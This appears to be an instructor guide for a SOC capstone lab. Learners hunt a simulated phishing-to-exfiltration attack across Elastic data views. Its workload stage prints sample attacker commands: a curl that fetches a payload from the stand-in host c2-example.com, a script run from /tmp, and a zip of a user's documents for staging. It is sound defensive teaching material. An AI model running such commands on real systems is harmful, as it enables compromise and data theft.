# Module 7 — Full-Scope Adversary Hunt (Capstone Investigation)


# Instructor Recording Guidance

This capstone investigation is intentionally less prescriptive than previous labs.

During the recording:

* Focus on investigative reasoning rather than memorizing queries
* Explain why pivots are performed between datasets
* Reinforce hypothesis-driven threat hunting techniques
* Correlate findings across multiple telemetry sources
* Encourage learners to think like SOC analysts conducting a real investigation

Avoid immediately revealing the complete attack chain.

The objective of this capstone is to simulate a realistic SOC investigation workflow using Elastic Security and synthetic telemetry.


## Setup



**Before you click the Start Lab button**

Read these instructions carefully before starting the lab.

* **Labs are timed.** When you click **Start Lab**, the timer starts immediately and shows how long your lab environment will remain available.
* **You cannot pause the lab.** Once the lab has started, the time continues to run until the session ends.
* This is a **simulation environment**. You will receive **temporary credentials** to sign in to Kibana for the duration of the lab.

To complete this lab, you need:

* Access to a standard internet browser (Chrome browser recommended).

<div><ql-infobox>

<strong>Note:</strong> Use an Incognito or private browser window to run this lab. This prevents conflicts with any existing sessions that may affect access to the lab environment.
</ql-infobox></div>

<div><ql-infobox>

<strong>Note:</strong> After clicking <strong>Start Lab</strong>, please allow <strong>5 minutes</strong> for the environment to fully initialize. During this time, Elasticsearch, Kibana, and the simulated Workspace telemetry are starting and data is being ingested. If Kibana does not load immediately, wait a few minutes and refresh the page. The lab timer continues to run during initialization.
</ql-infobox></div>

**How to start your lab and access Kibana**

### Step 1: Launch the Lab Environment

1. Click **Start Lab** to launch your investigation environment.

On the left is the **Lab details** pane which is populated with the temporary credentials needed for this lab.

![IAM Attack Diagram](https://raw.githubusercontent.com/baba219/threat-hunting-labs/baba-structure-gps-thr/labs/thl002-beacon-and-exfiltration/instructions/img/Screenshot%202026-03-03%20072948.png)

### Step 2: Access Kibana

2. Wait for the environment to initialize. Allow **5 minutes** for Kibana to become accessible.
3. In the left panel, copy the **Kibana URL** provided.
4. Paste the URL into your browser and press **Enter**.
5. If you see a message saying **"This site doesn't support a secure connection"**, click **Continue to site** to proceed.
6. In the left panel, copy the **Kibana Username** and **Kibana Password**.
7. Paste the credentials into the login page and click **Log in**.
8. Dismiss initial warnings inside Kibana.

<div><ql-infobox>

<strong>Tip:</strong> Keep the lab instructions and the Kibana page open in separate windows, side-by-side, to make investigation easier.
</ql-infobox></div>

**Verify access to the lab environment**

After signing in, confirm that you have access to the investigation environment.

1. In Kibana, open **Discover**.
2. Open the **Data view** selector.

You should see the following data views:

* `email-logs-*`
* `auth-logs-*`
* `audit-logs-*`
* `oauth-events-*`
* `mailbox-rules-*`
* `network-flow-*`
* `dns-logs-*`
* `workload-telemetry-*`
* `drive-activity-*` 
* `cloud-storage-*`


# Scenario Overview

A public sector organization reports suspicious outbound activity originating from an internal workstation.

Earlier in the day, a user reported interacting with a suspicious invoice-related email.

Initial alerts are low-confidence and fragmented across multiple telemetry sources. No single alert confirms compromise.

SOC analysts must correlate:

* Email activity
* Authentication telemetry
* Workload execution
* DNS activity
* Network flows
* SaaS audit events
* Threat intelligence indicators

to reconstruct the full adversary attack chain.


# Investigation Objectives

Participants are expected to:

* Investigate progressively across multiple datasets
* Validate hypotheses using telemetry evidence
* Correlate identity, workload, SaaS, and network activity
* Distinguish malicious activity from benign noise
* Reconstruct a complete attack timeline
* Produce a SOC-grade investigation summary


# Available Data Sources

Participants have access to the following Elastic data views:

* `email-logs-*` — email delivery and metadata
* `auth-logs-*` — authentication activity
* `audit-logs-*` — IAM and administrative changes
* `oauth-events-*` — OAuth grants and token activity
* `mailbox-rules-*` — mailbox forwarding and persistence activity
* `network-flow-*` — outbound network connections
* `dns-logs-*` — DNS telemetry
* `workload-telemetry-*` — process and file execution activity
* `drive-activity-*` — Google Drive access and sharing
* `cloud-storage-*` — cloud object storage activity


# Threat Intelligence Context

The threat intelligence team recently shared indicators associated with phishing infrastructure, suspicious OAuth applications, and known command-and-control activity.

Participants are not initially told whether these indicators are related to the current investigation.

## Stage 1 — Identify Initial Access

## Objective

Identify the suspicious phishing email and determine which user account may have been targeted.


## Instructor Demonstration Guide

Explain that phishing remains one of the most common initial access vectors in cloud and SaaS environments.

Reinforce that analysts often begin investigations with:

* user-reported activity,
* suspicious emails,
* or low-confidence alerts.

Explain that, at this stage, compromise has not yet been confirmed. The goal is to validate whether the email activity appears malicious and identify the potentially targeted user.

## Investigation Actions

Open: `Discover`

Select data view: `email-logs-*`

Run the following query:

  ```
message.subject:(invoice OR payment OR overdue OR remittance)
  ```

## Using Available Fields for Investigation

Explain to participants that the Available fields panel on the left side of Discover can greatly accelerate investigations.

Useful fields for this stage include:

* message.subject
* sender.email
* recipient.email
* message.link
* attachment.type
* labels
* message.display_name

Demonstrate how to:

* click a field to add it as a column,
* filter on a field value,
* and quickly pivot during the investigation.

Example:

* click on the `recipient.email` field in the Available fields panel
* review the Top values shown by Elastic
* locate `emily.carter@workspace-lab.com`
* click the `+` icon beside the email value to add a filter

Explain that field-based filtering is commonly used during investigations to quickly narrow the scope of suspicious activity.

## Identify the Suspicious Email:

Locate the suspicious event with the following characteristics:

* message.subject: `Invoice overdue - Action required`
* recipient.email: `emily.carter@workspace-lab.com`
* message.link: suspicious external verification link
* sender.email: external sender

Expand the event and review the following fields:

* `message.subject`
* `sender.email`
* `recipient.email`
* `message.link`
* `attachment.type`
* `labels`

The instructor should observe:

* labels: [external, invoice, urgent]
* attachment.type: pdf
* message.display_name: Microsoft Billing

Review the suspicious verification link:

* `https://invoice-portal.example/verify`

## Investigate:

* sender reputation,
* suspicious links,
* attachment names,
* targeted recipients,
* and phishing-related indicators.

Determine whether the email appears consistent with phishing or social engineering activity.

## Expected Findings

Participants should identify:

* a suspicious invoice-themed phishing email,
* an external sender,
* a suspicious verification link,
* and indicators suggesting social engineering activity.

## Instructor Notes

Explain that several indicators suggest phishing activity:

* urgency in the email subject,
* invoice/payment theme,
* external sender,
* suspicious verification link,
* and social engineering behavior.

Highlight that the labels field provides useful contextual enrichment:

* external
* invoice
* urgent

Emphasize that analysts should avoid assuming compromise too early.

The correct investigative approach is:

* identify suspicious activity,
* validate evidence,
* and pivot to additional telemetry sources.

## Transition Guidance

Pivot from the phishing email to authentication telemetry to determine whether the targeted account was compromised.

## Stage 2 — Validate Account Compromise

## Objective

Determine whether the targeted user account was compromised.

## Instructor Demonstration Guide

Explain that successful compromise often appears as:

* unusual authentication behavior,
* unfamiliar IP addresses,
* abnormal login timing,
* impossible travel,
* or suspicious geographic locations.

Highlight the importance of validating authentication activity against expected user behavior.

Explain that analysts should now investigate whether the phishing email identified in Stage 1 resulted in unauthorized account access.

## Investigation Actions

Open: `Discover`

Select data view: `auth-logs-*`

Run the following query:

  ```
user.email:"emily.carter@workspace-lab.com"
  ```

Review the returned authentication activity.

## Using Available Fields for Investigation

Explain to participants that the Available fields panel can help quickly identify suspicious login patterns.

Useful fields for this stage include:

* user.email
* source.ip
* geo.country_name
* geo.city_name
* user_agent.original
* device.name
* risk.score
* rule.name

Demonstrate how to:

* add fields as columns,
* filter on suspicious IP addresses,
* and review geographic login patterns.

Example:

* click on the `source.ip` field in the Available fields panel
* review the Top values shown by Elastic
* locate `91.198.174.192`
* click the `+` icon beside the IP address to add a filter

Explain that field-based filtering helps analysts isolate suspicious authentication activity during investigations.

## Identify the Suspicious Login:

Locate the suspicious authentication event with the following characteristics:

* user.email: `memily.carter@workspace-lab.com`
* source.ip: `91.198.174.192`
* geo.country_name: `Russia`
* risk.score: `88`

Expand the event and review the following fields:

* user.email
* source.ip
* geo.country_name
* geo.city_name
* user_agent.original
* device.name
* risk.score
* rule.name

The instructor should observe:

* geo.country_name: Russia
* geo.city_name: Moscow
* risk.score: 88
* rule.name: foreign_login_after_phishing

Review the login timing and compare it to the phishing email identified during Stage 1.

## Investigate:

* login timing,
* source IP addresses,
* geographic locations,
* authentication anomalies,
* and suspicious login patterns.

Determine whether the authentication activity appears consistent with legitimate user behavior.

## Expected Findings

Participants should identify:

* suspicious successful authentication activity,
* login activity originating from Russia,
* abnormal login behavior shortly after the phishing email,
* and indicators suggesting account compromise.

## Instructor Notes

Explain that several indicators suggest account compromise:

* suspicious login shortly after phishing activity,
* foreign geographic location,
* unfamiliar source IP address,
* elevated risk score,
* and correlation with the targeted phishing victim.

Emphasize that analysts should correlate authentication telemetry with previous investigation findings.

Highlight the importance of building an investigation timeline across multiple telemetry sources.

## Transition Guidance

Pivot from authentication activity into persistence mechanisms and administrative activity to determine whether the attacker established persistence or escalated privileges.

## Stage 3 — Investigate Persistence and Privilege Escalation

## Objective

Determine whether the attacker established persistence or escalated privileges after compromising the user account.

## Instructor Talking Points

Explain that attackers frequently establish persistence shortly after gaining access to an environment.

Examples include:

* mailbox forwarding rules,
* OAuth application abuse,
* token persistence,
* service account modifications,
* and IAM privilege escalation.

Highlight that persistence mechanisms allow attackers to maintain access even after passwords are changed.

Explain that analysts should now investigate whether the compromised account was used to establish persistence or perform administrative changes.

## Investigation Actions

Open: `Discover`

Select data view: `oauth-events-*`

Run the following query:

  ```
user.email:"emily.carter@workspace-lab.com"
  ```

Review the returned OAuth activity.

## Using Available Fields for Investigation

Explain to participants that the Available fields panel can help quickly identify suspicious persistence-related activity.

Useful fields for this stage include:

* oauth.app_name
* oauth.client_id
* oauth.scope
* source.ip
* geo.country_name
* risk.score
* rule.name

Demonstrate how to:

* add fields as columns,
* filter on suspicious OAuth applications,
* and review OAuth consent activity.

Example:

* click on the `oauth.app_name` field in the Available fields panel
* review the Top values shown by Elastic
* locate `Invoice Viewer Pro`
* click the `+` icon beside the application name to add a filter

Explain that field-based filtering helps analysts quickly isolate suspicious OAuth activity.

## Identify the Suspicious Login:

Locate the suspicious OAuth event with the following characteristics:

* oauth.app_name: `Invoice Viewer Pro`
* oauth.scope: `mail.read`, `drive.read`, `drive.write`
* geo.country_name: `France`
* risk.score: `92`

Expand the event and review the following fields:

* oauth.app_name
* oauth.client_id
* oauth.scope
* source.ip
* geo.country_name
* risk.score
* rule.name

The instructor should observe:

* suspicious OAuth consent activity,
* excessive OAuth permissions,
* elevated risk scoring,
* and OAuth persistence behavior.

Review the suspicious OAuth permissions:

* mail.read
* drive.read
* drive.write

## Investigate Mailbox Persistence

Switch data view: `mailbox-rules-*`

Run the following query:

  ```
user.email:"emily.carter@workspace-lab.com"
  ```

Review the returned mailbox rule activity.

## Using Available Fields for Mailbox Investigation

Useful fields for this stage include:

* forwarding.address
* destination.email
* rule.display_name
* rule_details.criteria
* risk.score

Example:

* click on the `forwarding.address` field in the Available fields panel
* review the Top values shown by Elastic
* locate the suspicious external email address
* click the `+` icon beside the application name to add a filter

## Identify Suspicious Mailbox Forwarding Activity:

Locate the suspicious mailbox forwarding event with the following characteristics:

* forwarding.address: external email address
* rule.display_name: `Auto-Forward Invoices`
* suspicious forwarding behavior

Expand the event and review the following fields:

* forwarding.address
* destination.email
* rule.display_name
* rule_details.criteria
* risk.score

The instructor should observe:

* mailbox forwarding persistence,
* forwarding to an external recipient,
* invoice-related forwarding criteria,
* and elevated risk scoring.

## Investigate IAM Privilege Escalation

Switch data view: `audit-logs-*`

Run the following query:

  ```
event.action:"setIamPolicy"
  ```

Review the returned IAM activity.

## Using Available Fields for IAM Investigation

Useful fields for this stage include:

* actor.email
* iam.role
* iam.change
* resource.name
* source.ip
* geo.country_name
* risk.score

Example:

* click on the `actor.email` field in the Available fields panel
* review the Top values shown by Elastic
* locate `emily.carter@workspace-lab.com`
* click the `+` icon beside the application name to add a filter

## Identify Suspicious IAM Activity:

Locate the suspicious IAM modification event with the following characteristics:

* actor.email: `emily.carter@workspace-lab.com`
* iam.role: roles/owner
* iam.change: `add`
* geo.country_name: `Russia`
* risk.score: `93`

Expand the event and review the following fields:

* actor.email
* iam.role
* iam.change
* resource.name
* source.ip
* geo.country_name
* risk.score
* rule.name

The instructor should observe:

* suspicious IAM privilege escalation,
* elevated permissions,
* abnormal geographic activity,
* and persistence-related behavior.

Investigate:

Review:

* role modifications,
* OAuth consent activity,
* mailbox forwarding behavior,
* suspicious administrative changes,
* and persistence-related activity.

Determine whether the activity appears consistent with attacker persistence or privilege escalation.

## Expected Findings

Participants should identify:

* suspicious OAuth application activity,
* excessive OAuth permissions,
* mailbox forwarding persistence,
* suspicious administrative changes,
* and abnormal IAM privilege escalation activity.

## Instructor Notes

Explain that attackers commonly establish persistence immediately after compromise.

Highlight that:

* OAuth abuse may survive password resets,
* mailbox forwarding enables silent email collection,
* and IAM changes may indicate privilege escalation attempts.

Emphasize the importance of correlating persistence activity with the phishing and authentication activity identified during previous investigation stages.

## Transition Guidance

Pivot into workload telemetry to determine what actions occurred on compromised systems.


## Stage 4 — Investigate Workload Execution and Staging


## Objective

Identify suspicious command execution and possible data staging activity on compromised systems.


## Instructor Demonstration Guide

Explain that attackers commonly use native operating system tools such as:

* curl,
* wget,
* python,
* tar,
* and zip

to retrieve payloads, execute scripts, and prepare data for exfiltration.

Highlight that native tools are frequently abused because they blend into legitimate system activity.

Emphasize the importance of correlating workload telemetry with previous phishing, authentication, and persistence findings.

Explain that analysts should now investigate whether suspicious commands were executed on compromised systems.


## Investigation Actions

Open: `Discover`

Select data view: `workload-telemetry-*`

Run the following query:

  ```
process.name:("curl" OR "wget" OR "python" OR "tar" OR "zip")
  ```

Review the returned process activity.

## Using Available Fields for Investigation

Explain to participants that the Available fields panel can help quickly isolate suspicious process execution activity.

Useful fields for this stage include:

* process.name
* process.command_line
* process.parent.name
* host.name
* user.email
* process.hash.sha256
* rule.name

Demonstrate how to:

* add process-related fields as columns,
* filter on suspicious process names,
* and review command-line execution activity.

Example:

* click on the `host.name` field in the Available fields panel
* review the Top values shown by Elastic
* locate `WKSTN-044`
* click the `+` icon beside the hostname to add a filter

Explain that field-based filtering helps analysts quickly isolate suspicious activity on compromised systems.

## Identify Suspicious Workload Activity:

Locate suspicious process execution events with the following characteristics:

* host.name: `WKSTN-044`
* user.email: `emily.carter@workspace-lab.com`
* suspicious native tooling activity
* outbound payload retrieval behavior

Expand the event and review the following fields:

* process.name
* process.command_line
* process.parent.name
* host.name
* user.email
* process.hash.sha256
* rule.name

The instructor should observe:

* suspicious command-line execution,
* payload retrieval behavior,
* archive staging activity,
* and possible preparation for exfiltration.

## Review Suspicious Commands

Locate and review suspicious commands such as:

Payload Retrieval

* `curl -fsSL http://c2-example.com/payload.bin -o /tmp/payload.bin`

Script Execution

* `python3 /tmp/payload.py --run`

Archive Creation

* `zip -r /tmp/archive.zip /home/emily/Documents`

Explain how these commands may indicate:

* payload delivery,
* malware execution,
* data staging,
* and preparation for exfiltration

Investigate:

Review:

* suspicious downloads,
* archive creation,
* script execution,
* command-line activity,
* payload retrieval behavior,
* and staging activity.

Determine whether the activity appears consistent with malicious execution and data preparation.

## Expected Findings

Participants should identify:

* payload retrieval activity,
* suspicious command execution,
* archive staging behavior,
* suspicious outbound tooling usage,
* and indicators suggesting preparation for exfiltration.

## Instructor Notes

Explain that attackers frequently abuse legitimate operating system tools to avoid detection.

Highlight that:

* command-line telemetry provides valuable investigation context,
* native tools are commonly used during post-compromise activity,
* and archive creation is frequently associated with data staging and exfiltration.

Emphasize the importance of correlating workload telemetry with upcoming DNS and network telemetry.

## Transition Guidance

Pivot from suspicious process execution into DNS and network telemetry to investigate command-and-control communication and possible exfiltration activity.


## Stage 5 — Investigate Command-and-Control Activity


## Objective

Identify outbound communication associated with attacker-controlled infrastructure.


## Instructor Demonstration Guide

Explain that command-and-control (C2) activity often appears as:

* periodic outbound communication,
* low-volume network traffic,
* repeated connections to the same infrastructure,
* and suspicious DNS resolution activity.

Highlight that attackers frequently use beaconing behavior to maintain communication with compromised systems.

Explain that DNS telemetry and network flow telemetry are commonly correlated to validate suspicious outbound activity.

Emphasize that analysts should now investigate whether the compromised workstation communicated with attacker-controlled infrastructure.

## Investigation Actions

Open: `Discover`

Select data view: `dns-logs-*`

Run the following query:

  ```
dns.question.name: "*c2-example.com"
  ```

Review the returned DNS activity.

## Using Available Fields for Investigation

Explain to participants that the Available fields panel can help quickly isolate suspicious DNS activity.

Useful fields for this stage include:

* dns.question.name
* source.host.name
* source.ip
* user.email
* event.action

Demonstrate how to:

* add DNS-related fields as columns,
* filter on suspicious domains,
* and identify recurring DNS queries.

Example:

* click on the `source.host.name` field in the Available fields panel
* review the Top values shown by Elastic
* locate `WKSTN-044`
* click the `+` icon beside the hostname to add a filter

Explain that field-based filtering helps analysts isolate DNS activity associated with a compromised system.

## Identify Suspicious DNS Activity:

Locate suspicious DNS events with the following characteristics:

* dns.question.name: subdomains of `c2-example.com`
* source.host.name: `WKSTN-044`
* repeated DNS query activity
* recurring outbound resolution behavior

Expand the event and review the following fields:

* dns.question.name
* source.host.name
* source.ip
* user.email
* event.action

The instructor should observe:

* repeated DNS queries,
* randomized subdomains,
* recurring DNS resolution behavior,
* and activity associated with the compromised workstation.

Explain that randomized subdomains are commonly associated with command-and-control infrastructure.

## Investigate Network Beaconing Activity

Switch data view: `network-flow-*`

Run the following query:

  ```
destination.domain:"c2-example.com"
  ```

Review the returned outbound network activity.

## Using Available Fields for Network Investigation

Useful fields for this stage include:

* destination.domain
* destination.ip
* source.host.name
* source.ip
* bytes_out
* network.direction
* user.email

Demonstrate how to:

* add network-related fields as columns,
* review repeated outbound connections,
* and identify recurring traffic patterns

Example:

* click on the `destination.domain` field in the Available fields panel
* review the Top values shown by Elastic
* locate `c2-example.com`
* click the `+` icon beside the domain to add a filter

## Identify Suspicious Beaconing Activity:

Locate suspicious outbound network activity with the following characteristics:

* destination.domain: `c2-example.com`
* source.host.name: `WKSTN-044`
* recurring outbound traffic
* low-volume periodic connections

Expand the events and review:

* destination.domain
* destination.ip
* source.host.name
* source.ip
* bytes_out
* network.direction
* user.email

The instructor should observe:

* recurring outbound communication,
* repeated low-volume traffic,
* periodic beaconing behavior,
* and suspicious outbound connections to attacker-controlled infrastructure.

Explain that randomized subdomains are commonly associated with command-and-control infrastructure.

Investigate:

Review:

* recurring outbound traffic,
* periodic communication patterns
* DNS resolution activity,
* unusual external connections,
* and low-volume beaconing behavior

Determine whether the activity appears consistent with command-and-control communication.

## Expected Findings

Participants should identify:

* beaconing behavior,
* repeated outbound communication,
* suspicious DNS activity,
* recurring communication with attacker-controlled infrastructure,
* and indicators consistent with command-and-control activity.

## Instructor Notes

Explain that attackers commonly use beaconing activity to maintain persistent communication with compromised systems.

Highlight that:

* periodic outbound traffic is a common C2 indicator,
* DNS telemetry can validate suspicious outbound communication,
* and low-volume traffic often attempts to avoid detection.

Emphasize the importance of correlating DNS and network telemetry during investigations.

## Transition Guidance

Pivot from beaconing activity into cloud and SaaS telemetry to determine whether data exfiltration occurred.


## Stage 6 — Investigate Data Exfiltration


## Objective

Determine whether sensitive data left the environment through outbound transfers, SaaS activity, or cloud storage uploads.

## Instructor Demonstration Guide

Explain that attackers frequently attempt to exfiltrate sensitive data after establishing persistence and accessing valuable systems or files.

Highlight that data exfiltration may occur through:

* cloud storage platforms,
* SaaS applications,
* external sharing activity,
* or direct outbound transfers.

Emphasize the importance of correlating:

* workload activity,
* outbound network traffic,
* and cloud audit telemetry.

Explain that analysts should now investigate whether the attacker attempted to move sensitive data outside the environment.

## Investigation Actions

Open: `Discover*`

Select data view: `network-flow-*`

Run the following query:

  ```
bytes_out > 5000000
  ```

Review the returned outbound network activity.

## Using Available Fields for Network Investigation

Explain to participants that the Available fields panel can help quickly isolate large outbound transfers.

Useful fields for this stage include:

* destination.domain
* destination.ip
* source.host.name
* source.ip
* bytes_out
* network.direction
* user.email

Demonstrate how to:

* add network-related fields as columns,
* identify large outbound transfers,
* and filter on suspicious destinations.

Example:

* click on the `source.host.name` field in the Available fields panel
* review the Top values shown by Elastic
* locate `WKSTN-044`
* click the `+` icon beside the domain to add a filter

## Identify Suspicious Outbound Transfers:

Locate suspicious outbound network activity with the following characteristics:

* destination.domain: `c2-example.com`
* source.host.name: `WKSTN-044`
* unusually large outbound transfer volume
* outbound traffic associated with the compromised user

Expand the event and review the following fields:

* destination.domain
* destination.ip
* source.host.name
* source.ip
* bytes_out
* network.direction
* user.email

The instructor should observe:

* large outbound traffic volume,
* suspicious outbound communication,
* and activity associated with the compromised workstation.

Explain that unusually large outbound transfers may indicate data exfiltration.

## Investigate External Sharing Activity

Switch data view: `drive-activity-*`

Run the following query:

  ```
event.action:"drive.share"
  ```

Review the returned cloud sharing activity.

## Using Available Fields for Drive Investigation

Useful fields for this stage include:

* event.action
* file.name
* file.sensitivity
* target.email
* share.permission
* source.ip
* user.email

Demonstrate how to:

* add file-sharing fields as columns,
* identify external recipients,
* and review sensitive file access.

Example:

* click on the `target.email` field in the Available fields panel
* review the Top values shown by Elastic
* locate suspicious external recipients
* click the `+` icon beside the domain to add a filter

## Identify Suspicious File Sharing Activity:

Locate suspicious sharing activity with the following characteristics:

* event.action: `drive.share`
* external recipient email address
* sensitive file sharing activity
* suspicious sharing behavior associated with the compromised account

Expand the event and review the following fields:

* file.name
* file.sensitivity
* target.email
* share.permission
* source.ip
* user.email

The instructor should observe:

* external file sharing,
* access to sensitive documents,
* suspicious sharing behavior,
* and potential SaaS-based exfiltration activity.

## Investigate Cloud Storage Upload Activity:

Switch data view: `cloud-storage-*`

Run the following query:

  ```
event.action:"storage.objects.insert"
  ```

Review the returned cloud storage activity.

## Using Available Fields for Drive Investigation

Useful fields for this stage include:

* object.name
* actor.email
* resource.name
* source.ip
* geo.country_name

Example:

* click on the `object.name` field in the Available fields panel
* review the Top values shown by Elastic
* locate suspicious archive uploads
* click the `+` icon beside the domain to add a filter

## Identify Suspicious Cloud Upload Activity:

Locate suspicious upload activity with the following characteristics:

* object.name: `archive.zip`
* suspicious upload behavior
* cloud storage insertion activity
* activity associated with the compromised account

Expand the event and review the following fields:

* object.name
* actor.email
* resource.name
* source.ip
* geo.country_name

The instructor should observe:

* suspicious archive uploads,
* cloud storage insertion activity,
* and possible exfiltration behavior.

## Investigate:

Review:

* large outbound transfers,
* external sharing activity,
* suspicious cloud uploads,
* sensitive file access,
* and possible exfiltration behavior.

Determine whether the activity appears consistent with data exfiltration.

## Expected Findings

Participants should identify:

* potential data staging activity,
* large outbound transfers,
* suspicious external file sharing,
* cloud storage upload activity,
* and indicators suggesting possible data exfiltration.

## Instructor Notes

Explain that attackers commonly use legitimate cloud services and SaaS platforms to avoid detection during exfiltration.

Highlight that:

* cloud storage uploads may indicate exfiltration,
* external file sharing is commonly abused,
* and outbound traffic volume may reveal staging or transfer activity.

Emphasize the importance of correlating:

* workload telemetry,
* network telemetry,
* and cloud audit logs during exfiltration investigations.

## Transition Guidance

Pivot into threat intelligence enrichment to validate suspicious infrastructure and attacker tooling.


## Stage 7 — Enrich with Threat Intelligence


## Objective

Correlate investigation findings with known malicious indicators and validate whether the observed activity is associated with attacker infrastructure or tooling.


## Instructor Demonstration Guide

Explain that threat intelligence enrichment helps analysts:

* validate suspicious activity,
* prioritize investigations,
* identify known malicious infrastructure,
* and correlate activity across multiple telemetry sources.

Highlight that IOC matching alone is not sufficient.

Emphasize that analysts should combine:

* indicators of compromise (IOCs),
* behavioral analysis,
* and telemetry correlation
to build high-confidence conclusions.

Explain that analysts should now validate whether previously observed activity matches known malicious indicators.

## Investigation Actions

Open: `Discover`

Review the following data views during the investigation:

* `dns-logs-*`
* `network-flow-*`
* `oauth-events-*`
* `workload-telemetry-*`

Use the provided threat intelligence indicators to validate previously observed activity.

## Provided Threat Intelligence Indicators

The threat intelligence team shared the following indicators for enrichment and validation:

* Malicious domain: `c2-example.com`
* Suspicious IP address: `203.0.113.10`
* Suspicious OAuth client ID: `oauth-client-9f3c2a1b`
* Suspicious OAuth application: `Invoice Viewer Pro`
* Known malicious SHA256:
  `7b2c9a1f4d9e8c0a3d2f1e0b9a8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c`

## Investigate Malicious Domain Activity

Select data view: `dns-logs-*`

Run the following query:

  ```
dns.question.name:"*c2-example.com"
  ```

Review the returned DNS activity.

## Using Available Fields for DNS Enrichment

Useful fields for this stage include:

* dns.question.name
* source.host.name
* source.ip
* user.emai

Example:

* click on the `dns.question.name` field in the Available fields panel
* review the Top values shown by Elastic
* locate suspicious subdomains associated with `c2-example.com`
* click the `+` icon beside the domain to add a filter

Explain that DNS telemetry is commonly enriched using known malicious domain indicators.

## Investigate Suspicious IP Activity

Switch data view: `network-flow-*`

Run the following query:

  ```
destination.ip:"203.0.113.10"
  ```

Review the returned outbound network activity.

## Using Available Fields for DNS Enrichment

Useful fields for this stage include:

* destination.ip
* destination.domain
* source.host.name
* bytes_out
* user.email

Example:

* click on the `destination.ip` field in the Available fields panel
* review the Top values shown by Elastic
* locate `203.0.113.10`
* click the `+` icon beside the domain to add a filter

## Investigate Suspicious OAuth Activity

Switch data view: `oauth-events-*`

Run the following query:

  ```
oauth.client_id:"oauth-client-9f3c2a1b"
  ```

Review the returned OAuth activity.

The instructor should observe:

* suspicious OAuth application activity,
* excessive OAuth permissions,
* and activity associated with previously identified persistence behavior.

## Investigate Malicious File Hash Activity

Switch data view: `workload-telemetry-*`

Run the following query:

  ```
process.hash.sha256:"7b2c9a1f4d9e8c0a3d2f1e0b9a8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c"
  ```

Review the returned workload activity.

## Identify Threat Intelligence Matches

The instructor should observe:

* DNS activity associated with `c2-example.com`,
* outbound communication to `203.0.113.10`,
* suspicious OAuth activity associated with `Invoice Viewer Pro`,
* and malicious process execution associated with the known SHA256 hash.

Explain that the observed activity now correlates with known malicious infrastructure and tooling.

## Investigate

Review:

* known malicious infrastructure,
* suspicious IP addresses,
* known malicious hashes,
* suspicious OAuth applications,
* and correlated telemetry activity.

Determine whether the investigation findings match known attacker infrastructure or previously identified malicious activity.

## Expected Findings

Participants should confirm that:

* observed DNS activity matches known malicious infrastructure,
* outbound communication matches attacker-controlled IP addresses,
* OAuth activity matches suspicious applications,
* malicious process execution matches known malware hashes,
* and multiple telemetry sources correlate to the same attack chain.

## Instructor Notes

Explain that threat intelligence enrichment increases investigation confidence by validating observed activity against known malicious indicators.

Highlight that:

* IOC matching alone is not sufficient,
* behavioral correlation remains critical,
* and threat intelligence should support — not replace — analyst investigation.

Emphasize the importance of correlating:

* phishing,
* authentication,
* persistence,
* workload,
* DNS,
* and network telemetry
into a unified investigation narrative.

## Transition Guidance

Pivot into full attack timeline reconstruction and incident summarization.

The next step is to reconstruct the complete attack chain using all previously identified telemetry and indicators.


## Stage 8 — Reconstruct the Attack Timeline


## Objective

Build a complete chronological timeline of the adversary activity across all telemetry sources.

## Instructor Demonstration Guide

Explain that timeline reconstruction is one of the most important parts of an investigation.

Highlight that timeline analysis helps analysts:

* understand the full attack chain,
* determine incident scope,
* identify attacker actions,
* assess impact,
* and support containment and response efforts.

Reinforce that no single dataset revealed the complete attack sequence.

Explain that analysts must correlate:
* phishing activity,
* authentication telemetry,
* persistence mechanisms,
* workload execution,
* DNS activity,
* network telemetry,
* and cloud activity
to reconstruct the full incident timeline.

## Investigation Actions

Open: `Discover`

Review the following data views during timeline reconstruction:

* `email-logs-*`
* `auth-logs-*`
* `oauth-events-*`
* `mailbox-rules-*`
* `audit-logs-*`
* `workload-telemetry-*`
* `dns-logs-*`
* `network-flow-*`
* `drive-activity-*`
* `cloud-storage-*`

Sort events chronologically using the `@timestamp` field.

## Using Available Fields for Timeline Reconstruction

Explain to participants that timeline reconstruction becomes easier when key fields are added as columns in Discover.

Useful fields for this stage include:

* @timestamp
* user.email
* source.ip
* geo.country_name
* process.name
* process.command_line
* destination.domain
* dns.question.name
* oauth.app_name
* event.action
* rule.name

Demonstrate how to:

* add timeline-related fields as columns,
* sort events chronologically,
* and pivot between telemetry sources.

Example:

* click on the `user.email` field
* review the Top values shown by Elastic
* locate `emily.carter@workspace-lab.com`
* click the `+` icon beside the email value to add a filter

Explain that filtering on a single compromised user helps analysts reconstruct activity more efficiently across multiple datasets.

## Reconstruct the Attack Sequence

Guide participants through correlating the following investigation findings in chronological order.

## Step 1 — Phishing Delivery

Review: `email-logs-*`

Identify:

* suspicious invoice-themed phishing email,
* external sender,
* and suspicious verification link.

Expected activity:

* phishing email delivery targeting `emily.carter@workspace-lab.com`

## Step 2 — Account Compromise

Review: `auth-logs-*`

Identify:

* suspicious successful login,
* foreign geographic location,
* and elevated risk scoring.

Expected activity:

* successful login from Russia shortly after phishing delivery

## Step 3 — OAuth Persistence

Review: `oauth-events-*`

Identify:

* suspicious OAuth application activity,
* excessive OAuth permissions,
* and persistence-related behavior.

Expected activity:

* OAuth consent granted to `Invoice Viewer Pro`

## Step 4 — Mailbox Persistence

Review: `mailbox-rules-*`

Identify:

* suspicious mailbox forwarding behavior,
* forwarding to external recipients,
* and invoice-related forwarding criteria.

Expected activity:

* mailbox forwarding rule creation

## Step 5 — Privilege Escalation

Review: `audit-logs-*`

Identify:

* suspicious IAM changes,
* elevated permissions,
* and abnormal administrative behavior.

Expected activity:

* addition of `roles/owner` permissions

## Step 6 — Workload Execution

Review: `workload-telemetry-*`

Identify:

* payload retrieval activity,
* suspicious command execution,
* and archive staging behavior.

Expected activity:

* curl downloads,
* python execution,
* and zip archive creation

## Step 7 — Command-and-Control Activity

Review:

* `dns-logs-*`
* `network-flow-*`

Identify:

* recurring DNS queries,
* beaconing behavior,
* and outbound communication to attacker-controlled infrastructure.

Expected activity:

* repeated communication with `c2-example.com`

## Step 8 — Data Exfiltration

Review:

* `drive-activity-*`
* `cloud-storage-*`

Identify:

* suspicious file downloads,
* external sharing activity,
* and cloud storage uploads.

Expected activity:

* sensitive file access,
* archive upload activity,
* and potential data exfiltration

## Investigate

Correlate findings across:

* email telemetry,
* authentication activity,
* OAuth activity,
* workload execution,
* DNS telemetry,
* network telemetry,
* and cloud telemetry.

